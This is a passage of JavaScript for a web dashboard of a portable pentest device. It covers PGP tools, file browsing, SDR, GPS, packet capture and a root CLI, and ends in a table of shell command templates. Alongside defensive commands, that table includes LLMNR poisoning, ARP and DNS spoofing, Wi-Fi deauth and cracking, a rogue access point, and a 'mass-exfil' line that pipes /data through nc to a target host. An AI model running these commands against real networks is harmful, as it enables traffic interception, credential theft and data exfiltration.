  if(!pubArmored){ pgpStatus('pgp-status','Need a public key to encrypt to.'); return; }
  if(!text){ pgpStatus('pgp-status','Nothing to encrypt.'); return; }
  pgpStatus('pgp-status','Encrypting…');
  try{
    const publicKey = await openpgp.readKey({armoredKey:pubArmored});
    const encrypted = await openpgp.encrypt({
      message: await openpgp.createMessage({text}),
      encryptionKeys: publicKey });
    document.getElementById('pgp-out').value = encrypted;
    pgpStatus('pgp-status','Encrypted. Copy the message below.', true);
  }catch(e){ pgpStatus('pgp-status','Error: '+e.message); }
}
async function pgpDecrypt(){
  if(!_pgpLoaded){ pgpStatus('pgp-status','Library still loading…'); return; }
  const privArmored=document.getElementById('pgp-priv').value.trim();
  const text=document.getElementById('pgp-text').value.trim();
  const pass=document.getElementById('pgp-pass').value||'';
  if(!privArmored){ pgpStatus('pgp-status','Need your private key to decrypt.'); return; }
  if(!text){ pgpStatus('pgp-status','Paste a PGP message to decrypt.'); return; }
  pgpStatus('pgp-status','Decrypting…');
  try{
    let privateKey = await openpgp.readPrivateKey({armoredKey:privArmored});
    if(!privateKey.isDecrypted()){
      privateKey = await openpgp.decryptKey({privateKey, passphrase:pass}); }
    const message = await openpgp.readMessage({armoredMessage:text});
    const {data} = await openpgp.decrypt({message, decryptionKeys:privateKey});
    document.getElementById('pgp-out').value = data;
    pgpStatus('pgp-status','Decrypted.', true);
  }catch(e){ pgpStatus('pgp-status','Error: '+e.message+' (wrong passphrase or key?)'); }
}

// Shared renderer for both FILES (current) and LOG (previous) tabs.
// boxId = list container, scope = 'current'|'previous', filterId = search input,
// viewId = inline view panel.
const _fileCache = {};   // scope -> tree, for client-side filtering
function renderFileTree(boxId, scope, filterId, viewId){
  const box=document.getElementById(boxId);
  if(!box) return;
  const filter=(document.getElementById(filterId)||{value:''}).value.toLowerCase();
  const typeSel=(document.getElementById(filterId+'-type')||{value:'all'}).value;
  const sortSel=(document.getElementById(filterId+'-sort')||{value:'new'}).value;
  const tree=(_fileCache[scope]||[]).filter(g=>g.count>0);
  // apply name + type filter per group, then sort
  const sortFn={
    'new':  (a,b)=>(b.mtime>a.mtime?1:-1),
    'old':  (a,b)=>(a.mtime>b.mtime?1:-1),
    'big':  (a,b)=>(b.size_kb-a.size_kb),
    'name': (a,b)=>a.name.localeCompare(b.name),
  }[sortSel]||((a,b)=>0);
  const groups=tree.map(g=>({...g, files:g.files
      .filter(f=>f.name.toLowerCase().includes(filter))
      .filter(f=>typeSel==='all'||f.type===typeSel)
      .sort(sortFn)}))
    .filter(g=>g.files.length>0);
  if(!groups.length){ box.innerHTML='<div style="color:var(--dim);font-size:.75em">'+(filter?'No matching files.':'No files here yet.')+'</div>'; return; }
  box.innerHTML='';
  groups.forEach(g=>{
    const collapsed = g._collapsed || false;
    const hdr=document.createElement('div');
    hdr.className='section-label';
    hdr.style.cssText='cursor:pointer;user-select:none';
    hdr.innerHTML=(collapsed?'▸ ':'▾ ')+g.icon+' '+g.tool.toUpperCase()+' ('+g.files.length+')';
    hdr.onclick=()=>{ g._collapsed=!g._collapsed; renderFileTree(boxId,scope,filterId,viewId); };
    box.appendChild(hdr);
    if(collapsed) return;
    g.files.forEach(f=>{
      const row=document.createElement('div');
      row.style.cssText='display:flex;align-items:center;gap:6px;padding:5px 6px;border:1px solid var(--border);border-radius:3px;margin-bottom:4px;background:var(--card)';
      const info=document.createElement('div');
      info.style.cssText='flex:1;min-width:0';
      info.innerHTML='<div style="color:var(--sec);font-size:.74em;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+escapeHtml(f.name)+'</div>'+
        '<div style="color:var(--dim);font-size:.66em">'+f.size_kb+' KB · '+f.mtime+'</div>';
      row.appendChild(info);
      if(f.viewable){
        const vb=document.createElement('button');
        vb.className='tool-btn'; vb.style.cssText='width:auto;margin:0;padding:4px 8px';
        vb.innerHTML='👁'; vb.title='View inline';
        vb.onclick=()=>viewFile(f.path,f.name,viewId);
        row.appendChild(vb);
        const ob=document.createElement('button');
        ob.className='tool-btn'; ob.style.cssText='width:auto;margin:0;padding:4px 8px';
        ob.innerHTML='↗'; ob.title='Open in new tab';
        ob.onclick=()=>{ window.open('/api/files/open?path='+encodeURIComponent(f.path),'_blank'); };
        row.appendChild(ob);
      }
      const db=document.createElement('button');
      db.className='tool-btn'; db.style.cssText='width:auto;margin:0;padding:4px 8px';
      db.innerHTML='⬇'; db.title='Download';
      db.onclick=()=>{ window.location='/api/files/download?path='+encodeURIComponent(f.path); };
      row.appendChild(db);
      const xb=document.createElement('button');
      xb.className='tool-btn'; xb.style.cssText='width:auto;margin:0;padding:4px 8px;border-color:#772222';
      xb.innerHTML='🗑'; xb.title='Delete';
      xb.onclick=()=>{ if(confirm('Delete '+f.name+'?')) deleteFile(f.path, boxId, scope, filterId, viewId); };
      row.appendChild(xb);
      box.appendChild(row);
    });
  });
}
function fetchFileTree(boxId, scope, filterId, viewId){
  const box=document.getElementById(boxId);
  if(box) box.innerHTML='<div style="color:var(--dim);font-size:.75em">Loading…</div>';
  fetch('/api/files?scope='+scope,{headers:{'X-API-Key':TR_KEY}}).then(r=>r.json()).then(d=>{
    _fileCache[scope]=d.tree||[];
    renderFileTree(boxId,scope,filterId,viewId);
  }).catch(()=>{ if(box) box.innerHTML='<div style="color:var(--red);font-size:.75em">Could not load files.</div>'; });
}
function loadFiles(){ fetchFileTree('files-list','current','files-filter','file-view'); }
function loadLog(){ fetchFileTree('log-list','previous','log-filter','log-view'); }
function clearAllLogs(){
  const tree=_fileCache['previous']||[];
  const files=[];
  tree.forEach(g=>g.files.forEach(f=>files.push(f.path)));
  if(!files.length){ alert('No previous logs to clear.'); return; }
  if(!confirm('Delete all '+files.length+' previous-connection files? This cannot be undone.')) return;
  let done=0;
  files.forEach(p=>{
    fetch('/api/files/delete',{method:'POST',
      headers:{'X-API-Key':TR_KEY,'Content-Type':'application/json'},
      body:JSON.stringify({path:p})})
      .then(()=>{ done++; if(done===files.length) loadLog(); });
  });
}
function deleteFile(path, boxId, scope, filterId, viewId){
  fetch('/api/files/delete',{method:'POST',
    headers:{'X-API-Key':TR_KEY,'Content-Type':'application/json'},
    body:JSON.stringify({path})})
    .then(r=>r.json()).then(d=>{
      if(d.ok){ fetchFileTree(boxId, scope, filterId, viewId); }
      else { alert('Delete failed: '+(d.error||'unknown')); }
    }).catch(e=>alert('Delete error: '+e));
}
function viewFile(path,name,viewId){
  const out=document.getElementById(viewId||'file-view');
  if(out) out.textContent='Loading '+name+'…';
  fetch('/api/files/view?path='+encodeURIComponent(path),{headers:{'X-API-Key':TR_KEY}})
    .then(r=>r.json()).then(d=>{
      if(out) out.textContent = d.ok ? (d.content||'(empty)') : ('Error: '+(d.error||'cannot view'));
    }).catch(e=>{ if(out) out.textContent='Error: '+e; });
}

function loadStats() {
  fetch('/api/status').then(r=>r.json()).then(d=>{
    const set = (id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v;};
    const bar = (id,v)=>{const e=document.getElementById(id);if(e)e.style.width=v+'%';};
    set('s-ip', d.ip||'10.0.0.243');
    set('s-uptime', d.uptime||'—');
    set('s-temp', d.temp||'—');
    set('s-cpu', d.cpu+'%');
    set('s-ram', d.ram+'%');
    set('s-disk', d.disk+'%');
    set('s-sdr', d.sdr?'CONNECTED':'NO DONGLE');
    set('s-pp', ({mayhem:'MAYHEM', hackrf:'SDR MODE'})[d.portapack]||'—');
    set('s-fz', ({usb:'USB', wifi:'WIFI BRIDGE'})[d.flipper]||'—');
    bar('cpu-bar', d.cpu||0);
    bar('ram-bar', d.ram||0);
    bar('disk-bar', d.disk||0);
    const al = document.getElementById('activity-log');
    if(al && d.log) al.innerHTML = d.log.slice(0,6).map(l=>`<div class="log-entry">${esc(l)}</div>`).join('');
  }).catch(()=>{});
}

function setSDRPreset(start, end) {
  out.textContent = '$ SDR preset: ' + start + '-' + end + ' MHz\n[ scanning... ]';
  fetch('/api/sdr/scan', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({start_freq:start+'M', stop_freq:end+'M', bin_size:'200k'})
  }).then(r=>r.json()).then(d=>{ out.textContent = JSON.stringify(d,null,2); });
}
function startSDRScan() { setSDRPreset(88, 108); }
function startSDRLive() { out.textContent = '[ SDR live stream — use /api/sdr/live ]'; }

// Tooltip system
const tipBox = document.getElementById('tooltip-box');
function showTip(el, e) {
  const tip = el.getAttribute('data-tip');
  if(!tip) return;
  tipBox.textContent = tip;
  tipBox.style.display = 'block';
  moveTip(e);
}
function moveTip(e) {
  if(!tipBox || tipBox.style.display==='none') return;
  const x = e.clientX || (e.touches && e.touches[0].clientX) || 0;
  const y = e.clientY || (e.touches && e.touches[0].clientY) || 0;
  tipBox.style.left = Math.min(x+14, window.innerWidth-240) + 'px';
  tipBox.style.top = Math.max(y-10, 0) + 'px';
}
function hideTip() { if(tipBox) tipBox.style.display='none'; }
document.querySelectorAll('.tool-btn[data-tip]').forEach(btn=>{
  btn.addEventListener('mouseenter', e=>showTip(btn,e));
  btn.addEventListener('mousemove',  e=>moveTip(e));
  btn.addEventListener('mouseleave', hideTip);
  btn.addEventListener('touchstart', e=>{ showTip(btn, e.touches[0]); }, {passive:true});
  btn.addEventListener('touchend',   hideTip);
});

// ANSI color codes to HTML
function ansiToHtml(text) {
  const map = {
    '30':'#555','31':'var(--xred)','32':'#44ff44','33':'#ffff44',
    '34':'#4488ff','35':'#ff44ff','36':'#44ffff','37':'#cccccc',
    '90':'#888','91':'#ff6666','92':'#66ff66','93':'#ffff66',
    '94':'#66aaff','95':'#ff66ff','96':'#66ffff','97':'#ffffff',
    '0':'inherit','1':'inherit'
  };
  let html = text
    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/\x1b\[([0-9;]+)m/g, (m,codes)=>{
      const parts = codes.split(';');
      let style='';
      parts.forEach(c=>{
        if(map[c]) style+=`color:${map[c]};`;
        if(c==='1') style+='font-weight:bold;';
      });
      return style ? `<span style="${style}">` : '</span>';
    });
  return html;
}

// Override run() to use ANSI rendering


// Output tab switcher
function setOutputTab(tab) {
  const toolPane = document.getElementById('pane-tool');
  const cliPane  = document.getElementById('pane-cli');
  const toolTab  = document.getElementById('tab-tool');
  const cliTab   = document.getElementById('tab-cli');
  if(tab==='tool') {
    toolPane.style.display='block'; cliPane.style.display='none';
    toolTab.style.background='var(--ddim)'; toolTab.style.color='var(--red)';
    cliTab.style.background='transparent'; cliTab.style.color='var(--border)';
  } else {
    toolPane.style.display='none'; cliPane.style.display='flex'; cliPane.style.flexDirection='column';
    cliTab.style.background='var(--ddim)'; cliTab.style.color='var(--red)';
    toolTab.style.background='transparent'; toolTab.style.color='var(--border)';
    document.getElementById('cli-input').focus();
  }
}

// Interactive CLI terminal
const cliHistory = [];
let cliHistIdx = -1;
function cliKey(e) {
  const input = document.getElementById('cli-input');
  if(e.key==='Enter') {
    const cmd = input.value.trim();
    if(!cmd) return;
    cliHistory.unshift(cmd);
    cliHistIdx = -1;
    input.value = '';
    cliAppend('<span style="color:var(--red)">root@tunnel-rat:~$ ' + cmd.replace(/</g,'&lt;') + '</span>');
    fetch('/api/cli', {
      method:'POST',
      headers:{'Content-Type':'application/json','X-API-Key':TR_KEY},
      body: JSON.stringify({cmd})
    }).then(r=>r.json()).then(d=>{
      cliAppend('<span style="color:#cc2222">' + ansiToHtml(d.output||d.error||'(no output)') + '</span>');
    }).catch(err=>{ cliAppend('<span style="color:var(--dim)">Error: '+err+'</span>'); });
  } else if(e.key==='ArrowUp') {
    cliHistIdx = Math.min(cliHistIdx+1, cliHistory.length-1);
    input.value = cliHistory[cliHistIdx] || '';
    e.preventDefault();
  } else if(e.key==='ArrowDown') {
    cliHistIdx = Math.max(cliHistIdx-1, -1);
    input.value = cliHistIdx>=0 ? cliHistory[cliHistIdx] : '';
    e.preventDefault();
  }
}
function cliAppend(html) {
  const el = document.getElementById('cli-output');
  if(!el) return;
  el.innerHTML += html + '\n';
  el.scrollTop = el.scrollHeight;
}
// Initialize CLI
cliAppend('<span style="color:var(--dim)">Tunnel R.A.T. Terminal — type commands below</span>');

// SDR Functions
function sdrScan() {
  const start = document.getElementById('sdr-start').value;
  const stop  = document.getElementById('sdr-stop').value;
  out.textContent = '$ rtl_power scanning ' + start + ' to ' + stop + '\n[ scanning... takes ~10s ]';
  fetch('/api/sdr/scan', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({start_freq: start, stop_freq: stop, bin_size: '200k'})
  }).then(r=>r.json()).then(d=>{
    if(d.ok && d.points.length) {
      const pts = d.points;
      const peak = pts.reduce((a,b)=>a.power>b.power?a:b);
      out.textContent = '$ Scan complete\n';
      out.textContent += 'Points: ' + pts.length + '\n';
      out.textContent += 'Peak: ' + peak.freq + ' MHz @ ' + peak.power.toFixed(1) + ' dBm\n\n';
      drawSpectrum(pts.map(p=>[p.freq,p.power]), 'RTL '+start+'–'+stop);
      pts.forEach(p=>{ out.textContent += p.freq + ' MHz: ' + p.power.toFixed(1) + ' dBm\n'; });
    } else {
      out.textContent = d.error || 'Scan failed';
    }
  });
}

function quickScan(start, stop) {
  document.getElementById('sdr-start').value = start;
  document.getElementById('sdr-stop').value = stop;
  sdrScan();
}

let fmAudio = null;
function sdrFM() {
  const freq = document.getElementById('fm-freq').value;
  out.textContent = '$ rtl_fm decoding ' + freq + '\n[ starting... ]';
  fetch('/api/sdr/fm', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({freq: freq, action: 'start'})
  }).then(r=>r.json()).then(d=>{
    if(d.ok) {
      out.textContent = '$ FM ACTIVE: ' + freq + '\n[ streaming audio to browser ]\n\nIf no sound:\n1. Check browser allows autoplay\n2. Click the audio player below';
      // Create/update audio element
      if(fmAudio) { fmAudio.pause(); fmAudio.remove(); }
      fmAudio = document.createElement('audio');
      fmAudio.controls = true;
      fmAudio.autoplay = true;
      fmAudio.src = '/api/sdr/stream?' + Date.now();
      fmAudio.style.cssText = 'width:100%;margin-top:8px;filter:invert(1) hue-rotate(180deg)';
      document.getElementById('output-zone').appendChild(fmAudio);
    } else {
      out.textContent = 'Error: ' + d.error;
    }
  });
}

function sdrADSB(action) {
  out.textContent = '$ ADS-B ' + action + '\n[ ' + action + 'ing... ]';
  fetch('/api/sdr/adsb', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({action: action})
  }).then(r=>r.json()).then(d=>{
    out.textContent = d.msg || d.error || JSON.stringify(d);
  });
}

function sdrStop(mode) {
  fetch('/api/sdr/stop', {method:'POST'}).then(r=>r.json()).then(d=>{
    out.textContent = '$ SDR stopped';
  });
}

function checkSDRStatus() {
  fetch('/api/sdr/status').then(r=>r.json()).then(d=>{
    const el = document.getElementById('sdr-status-pill');
    if(el) el.textContent = d.detected ? '● RTL2838 DETECTED' : '○ No SDR found';
    if(el) el.style.color = d.detected ? '#cc2222' : 'var(--dim)';
  }).catch(()=>{});
}
checkSDRStatus();
setInterval(checkSDRStatus, 10000);

// OSINT
// Live Feed
// Live feed tab switcher
function setLiveTab(tab) {
  if(tab!=='ppscreen' && _ppMirrorOn) ppMirror(false);
  ['network','capture','pcaps','pineapple','ppscreen','spectrum'].forEach(t=>{
    document.getElementById('lp-'+t).style.display = t===tab ? (['capture','ppscreen','spectrum'].includes(t)?'flex':'block') : 'none';
    const btn = document.getElementById('lt-'+t);
    if(btn) { btn.style.background = t===tab?'var(--ddim)':'transparent'; btn.style.color = t===tab?'var(--red)':'var(--border)'; }
  });
  if(tab==='pcaps') loadPcapList();
}

// Live capture
let capTool = null, capInterval = null, capOffset = 0;
function startCapture() {
  const mode  = document.getElementById('cap-mode').value;
  const iface = document.getElementById('cap-iface').value;
  const filt  = document.getElementById('cap-filter').value;
  const out   = document.getElementById('cap-output');
  if(out) { out.innerHTML = ''; }
  capOffset = 0;
  fetch('/api/capture/start',{
    method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({mode,iface,filter:filt})
  }).then(r=>r.json()).then(d=>{
    if(d.ok) {
      capTool = d.tool;
      if(out) out.innerHTML += '<span style="color:var(--red)">=== '+mode+' on '+iface+' started ===</span>\n';
      capInterval = setInterval(pollCapture, 800);
    }
  });
}
function pollCapture() {
  if(!capTool) return;
  fetch('/api/capture/tail?tool='+capTool+'&offset='+capOffset)
    .then(r=>r.json()).then(d=>{
      if(d.output) {
        const out = document.getElementById('cap-output');
        if(out) {
          out.innerHTML += ansiToHtml(d.output).replace(/\n/g,'<br>');
          out.scrollTop = out.scrollHeight;
          capOffset += d.output.length;
        }
      }
    });
}
function stopCapture() {
  if(capInterval) { clearInterval(capInterval); capInterval=null; }
  if(capTool) {
    fetch('/api/capture/stop',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tool:capTool})});
    const out = document.getElementById('cap-output');
    if(out) out.innerHTML += '<span style="color:var(--dim)">\n=== capture stopped ===</span>\n';
    capTool = null;
  }
}
function loadPcapList() {
  fetch('/api/capture/list').then(r=>r.json()).then(d=>{
    const el = document.getElementById('pcap-list');
    if(!el) return;
    if(!d.files || !d.files.length) { el.innerHTML='<span style="color:var(--border)">No captures yet</span>'; return; }
    el.innerHTML = d.files.map(f=>`
      <div style="border-bottom:1px solid var(--card);padding:4px 0">
        <span style="color:var(--dim)">${f.name}</span>
        <span style="color:var(--dim);margin-left:8px">${(f.size/1024).toFixed(1)}KB</span>
      </div>`).join('');
  });
}

function loadLiveFeed() {
  fetch('/api/live/netinfo').then(r=>r.json()).then(d=>{
    const conns = document.getElementById('lf-connections');
    const ifaces = document.getElementById('lf-interfaces');
    const arp = document.getElementById('lf-arp');
    const gps = document.getElementById('lf-gps');
    if(conns) conns.innerHTML = d.connections && d.connections.length ?
      d.connections.map(c=>{
        const p = c.trim().split(/\s+/);
        return `<div style="color:var(--dim)">${p[3]||''} → ${p[4]||''}</div>`;
      }).join('') : '<div style="color:var(--border)">No active connections</div>';
    if(ifaces) ifaces.innerHTML = d.interfaces && d.interfaces.length ?
      d.interfaces.map(i=>`<div style="color:var(--dim)">${i}</div>`).join('') :
      '<div style="color:var(--border)">No interfaces</div>';
    if(arp) arp.innerHTML = d.arp && d.arp.length ?
      d.arp.map(a=>{
        const p = a.trim().split(/\s+/);
        return `<div style="color:var(--dim)">${p[0]} <span style="color:var(--dim)">${p[2]||''}</span></div>`;
      }).join('') : '<div style="color:var(--border)">Empty ARP table</div>';
    if(gps) {
      try {
        const lines = (d.gps_raw||'').split(/\r?\n/).filter(Boolean);
        let fix = 'NO FIX', lat='—', lon='—', sats='—', srcl='—', best=null;
        const consider=(t)=>{ if(t && (!best || (t.mode||0) > (best.mode||0))) best=t; };
        lines.forEach(l=>{
          try {
            const j = JSON.parse(l);
            if(j.class==='TPV') consider(j);
            // POLL carries one tpv[] entry per GPS (USB u-blox, MDK over WiFi)
            if(j.class==='POLL'){
              (j.tpv||[]).forEach(consider);
              if(j.sky && j.sky.length){ const sk=j.sky[j.sky.length-1]; sats=(sk.satellites||[]).filter(s=>s.used).length; }
            }
            if(j.class==='SKY') sats = (j.satellites||[]).filter(s=>s.used).length;
          } catch(e) {}
        });
        if(best){
          fix = best.mode>=2 ? (best.mode===3?'3D FIX':'2D FIX') : 'NO FIX';
          if(typeof best.lat==='number') lat = best.lat.toFixed(5);
          if(typeof best.lon==='number') lon = best.lon.toFixed(5);
          const dv = best.device||'';
          srcl = dv.startsWith('udp://') ? 'MDK (WiFi)' : (dv ? 'USB '+dv.split('/').pop() : '—');
        }
        gps.innerHTML = `<div style="color:${fix!=='NO FIX'?'#cc2222':'var(--dim)'}">${fix}</div>
          <div>LAT: <span style="color:var(--dim)">${lat}</span></div>
          <div>LON: <span style="color:var(--dim)">${lon}</span></div>
          <div>SATS: <span style="color:var(--dim)">${sats}</span></div>
          <div>SRC: <span style="color:var(--dim)">${srcl}</span></div>`;
      } catch(e) {
        gps.innerHTML = '<div style="color:var(--border)">GPS: no data</div>';
      }
    }
  }).catch(()=>{});
}
loadLiveFeed();
setInterval(loadLiveFeed, 5000);

// Clock
function tick() {
  const t = document.getElementById('sb-time');
  if(t) t.textContent = new Date().toLocaleTimeString();
}
tick(); setInterval(tick, 1000);
loadStats(); setInterval(loadStats, 5000);

// Floating tooltips
const _tb = document.getElementById('tooltip-box');
document.querySelectorAll('.tool-btn[data-tip]').forEach(btn=>{
  btn.addEventListener('mouseenter', e=>{ _tb.textContent=btn.getAttribute('data-tip'); _tb.style.display='block'; });
  btn.addEventListener('mousemove',  e=>{ _tb.style.left=Math.min(e.clientX+14,window.innerWidth-240)+'px'; _tb.style.top=Math.max(e.clientY-10,0)+'px'; });
  btn.addEventListener('mouseleave', ()=>{ _tb.style.display='none'; });
  btn.addEventListener('touchstart', e=>{ _tb.textContent=btn.getAttribute('data-tip'); _tb.style.display='block'; _tb.style.left='50%'; _tb.style.top='40%'; },{passive:true});
  btn.addEventListener('touchend',   ()=>{ setTimeout(()=>_tb.style.display='none',1500); });
});

// ANSI to HTML
function ansiToHtml(t) {
  const m={'31':'var(--xred)','32':'#44ff44','33':'#ffff44','34':'#4488ff','35':'#ff44ff','36':'#44ffff','37':'#ccc','0':'inherit'};
  return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
    .replace(/\x1b\[([0-9;]+)m/g,(_,c)=>{const s=c.split(';').map(x=>m[x]?`color:${m[x]};`:'').join('');return s?`<span style="${s}">`:'</span>';});
}

// Visual CLI — buttons populate input, user runs
const HINTS={
  'bettercap':    '# Runs net.probe + net.recon on the detected interface, non-interactively. Discovers devices; streams to the log.',
  'responder':    '# Poisons LLMNR/NBT-NS to capture NTLMv2 hashes.',
  'mitmproxy':    '# Headless HTTP/HTTPS interceptor (mitmdump) on port 8081. Point a device proxy at this host:8081.',
  'arp-spoof':    '# Replace TARGET with victim IP to intercept traffic.',
  'dns-spoof':    '# Replace TARGET with domain to redirect DNS.',

  'nmap-scan':    '# Scans TunnelRAT subnet — replace range if needed.',
  'hashcat':      '# Replace capture.hc22000 with your handshake file.',
  'aircrack':     '# Replace capture.cap with your airodump capture.',
  'wifite':       '# Automated WiFi attack — prompts for target.',
  'reaver':       '# Replace BSSID with target AP MAC address.',
  'suricata-status':'# IDS status — configure iface in suricata.yaml first.',
  'fail2ban-status':'# Shows active jails and currently banned IPs.',
  'clamav-scan':  '# Full scan — narrow path to speed it up.',
  'fw-status':    '# Shows all iptables chains and rules.',
  'isolate':      '# Replace TARGET with IP to block all forwarded traffic.',
  'connections':  '# Live TCP connections with process names.',
  'whois':        '# Domain registration, owner, nameservers.',
  'nmap':         '# Port + service scan — replace TARGET with IP/domain.',
  'sslscan':      '# Tests SSL/TLS ciphers and cert — replace TARGET.',
  'whatweb':      '# Fingerprints web stack — replace TARGET with URL.',
  'wafw00f':      '# Detects WAF — replace TARGET with URL.',
  'nikto':        '# Web vuln scanner — takes up to 60s.',
  'subfinder':    '# Passive subdomain discovery — replace TARGET.',
  'fierce':       '# DNS brute-force subdomains — replace TARGET.',
  'amass':        '# Deep subdomain enum — slow, replace TARGET.',
  'harvester':    '# Finds emails/names from public sources.',
  'sherlock':     '# Checks USERNAME across 300+ social platforms.',
  'exiftool':     '# Extracts file metadata — replace with file path.',
};
function run(action) {
  const T={
    'bettercap':'source /opt/tunnel-rat/tr-lib.sh 2>/dev/null; IF=$(tr_find_adapter 2>/dev/null); IF=${IF:-wlp1s0}; bettercap --iface "$IF" --no-colors --no-history --eval "net.probe on"',
    'responder':'source /opt/tunnel-rat/tr-lib.sh 2>/dev/null; IF=$(tr_find_adapter 2>/dev/null); IF=${IF:-wlp1s0}; python3 /opt/Responder/Responder.py -I "$IF"',
    'mitmproxy':'mitmdump --listen-host 0.0.0.0 -p 8081 --set console_eventlog_verbosity=info',
    'arp-spoof':'source /opt/tunnel-rat/tr-lib.sh 2>/dev/null; IF=$(tr_find_adapter 2>/dev/null); IF=${IF:-wlp1s0}; bettercap --iface "$IF" --no-colors -eval "set arp.spoof.targets TARGET; arp.spoof on"',
    'dns-spoof':'source /opt/tunnel-rat/tr-lib.sh 2>/dev/null; IF=$(tr_find_adapter 2>/dev/null); IF=${IF:-wlp1s0}; bettercap --iface "$IF" --no-colors -eval "set dns.spoof.domains TARGET; dns.spoof on"',
    'rogue-start':'sudo bash ~/tunnel-rat-build/rogue-ap.sh start "tunnel-rat-test" 6',
    'rogue-stop':'sudo bash ~/tunnel-rat-build/rogue-ap.sh stop',
    'rogue-status':'sudo bash ~/tunnel-rat-build/rogue-ap.sh status',
    'rogue-clients':'sudo bash ~/tunnel-rat-build/rogue-ap.sh clients',
    'nmap-scan':'source /opt/tunnel-rat/tr-lib.sh 2>/dev/null; NET=$(tr_target_subnet); echo "Scanning $NET (the network you are connected to)"; nmap -sV -T4 --open "$NET"',
    'port-kill':'ss -tnp | grep :PORT','stream-killer':'tcpkill -i eth0 host TARGET',
    'mass-exfil':'tar -czf - /data | nc TARGET 4444',
    'hashcat':'hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt',
    'aircrack':'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap',
    'wifite':'wifite --wpa --dict /usr/share/wordlists/rockyou.txt',
    'reaver':'reaver -i wlx7cf17e188725 -b BSSID -vv',
    'suricata-status':'systemctl status suricata','suricata-start':'sudo systemctl start suricata && echo "Suricata started."','suricata-stop':'sudo systemctl stop suricata && echo "Suricata stopped."',
    'zeek-status':'systemctl status zeek --no-pager -l | head -8',
    'fail2ban-status':'systemctl is-active fail2ban >/dev/null 2>&1 && sudo fail2ban-client status || { echo "fail2ban not running. Start it: sudo systemctl start fail2ban"; sudo systemctl start fail2ban 2>/dev/null && echo "(started it now — try again)"; }',
    'clamav-scan':'clamscan -r /root --bell -i','fw-status':'iptables -L -n --line-numbers',
    'isolate':'iptables -I FORWARD -s TARGET -j DROP',
    'def-devices':'sudo bash ~/tunnel-rat-build/net-defense.sh devices',
    'def-unknown':'sudo bash ~/tunnel-rat-build/net-defense.sh unknown',
    'def-alerts':'sudo bash ~/tunnel-rat-build/net-defense.sh alerts',
    'def-known':'sudo bash ~/tunnel-rat-build/net-defense.sh known',
    'def-block':'sudo bash ~/tunnel-rat-build/net-defense.sh block MAC',
    'def-unblock':'sudo bash ~/tunnel-rat-build/net-defense.sh unblock MAC',
    'def-blocked':'sudo bash ~/tunnel-rat-build/net-defense.sh blocked',
    'def-unblock-all':'sudo bash ~/tunnel-rat-build/net-defense.sh unblock-all',
    'def-allow':'sudo bash ~/tunnel-rat-build/net-defense.sh allow MAC name',
    'deauth':'sudo bash ~/tunnel-rat-build/deauth.sh CLIENT_MAC AP_BSSID 6 10',
    'sight-scan':'sudo bash /opt/tunnel-rat/payloads/sightings-tracker.sh scan',
    'sight-report':'sudo bash /opt/tunnel-rat/payloads/sightings-tracker.sh report',
    'sight-trackers':'sudo bash /opt/tunnel-rat/payloads/sightings-tracker.sh trackers',
    'sight-reset':'sudo bash /opt/tunnel-rat/payloads/sightings-tracker.sh reset',
    'wardrive-start':'sudo bash ~/tunnel-rat-build/wardrive-logger.sh start',
    'wardrive-stop':'sudo bash ~/tunnel-rat-build/wardrive-logger.sh stop',
    'wardrive-status':'sudo bash ~/tunnel-rat-build/wardrive-logger.sh status',
    'auditd-status':'systemctl status auditd --no-pager -l | head -8 || service auditd status','connections':'ss -tnp',
    'active-ports':'ss -tulpn','arp-table':'arp -n',
    'wifi-scan':'nmcli device wifi list',
    'sys-info':'uname -a && uptime && free -h','myip':'curl -s https://ipinfo.io/ip',
    'sys-shutdown':'echo "Shutting down safely in 5s — wait for the lights to stop, then pull power."; sleep 5; sudo shutdown -h now',
    'sys-reboot':'echo "Rebooting — the dashboard will drop and come back in ~40s."; sleep 2; sudo reboot',
    'sys-services':'systemctl is-active tunnel-rat hostapd dnsmasq tor suricata 2>/dev/null; echo "---"; systemctl --failed --no-pager',
    'sys-disk':'df -h / && echo "---" && du -sh /opt/tunnel-rat/captures 2>/dev/null',
    'sys-temp':'echo "CPU temp:"; cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null | awk \'{print $1/1000"°C"}\'',
    'ps-list':'echo "=== Running pentest tools ==="; for t in bettercap mitmdump mitmproxy Responder.py tcpdump tshark airodump-ng aireplay-ng wifite reaver kismet hostapd_cli suricata responder nmap; do pgrep -af "$t" 2>/dev/null; done | grep -v grep | sort -u || echo "(none running)"',
    'ps-kill-tools':'echo "Stopping pentest tools (dashboard + AP are protected)..."; for t in bettercap mitmdump mitmproxy Responder.py tcpdump tshark airodump-ng aireplay-ng wifite reaver kismet nmap; do pkill -f "$t" 2>/dev/null && echo "  killed $t"; done; echo "Done."',
    'dns-lookup':'dig TARGET ANY +short','traceroute':'traceroute -m 15 TARGET',
    'whois':'whois TARGET','recon-ng':'recon-ng','sdr':'rtl_test -t',
    'arp-scan':'arp-scan -l','netdiscover':'source /opt/tunnel-rat/tr-lib.sh 2>/dev/null; NET=$(tr_target_subnet); echo "Scanning $NET"; netdiscover -r "$NET"',
    'list-captures':'ls -lh ~/tunnel-rat-build/','ble-audit-list':'ls ~/tunnel-rat-build/captures/',
    'tor-status':'systemctl is-active tor && systemctl status tor --no-pager -l | head -6',
    'tor-start':'sudo systemctl start tor && sleep 1 && systemctl is-active tor',
    'tor-stop':'sudo systemctl stop tor; systemctl is-active tor; true',
    'tor-ip':'curl -s --max-time 15 --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip',
    'tor-newid':'sudo pkill -HUP tor && sleep 3 && curl -s --max-time 15 --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip',
    'myip-real':'curl -s --max-time 5 https://check.torproject.org/api/ip',
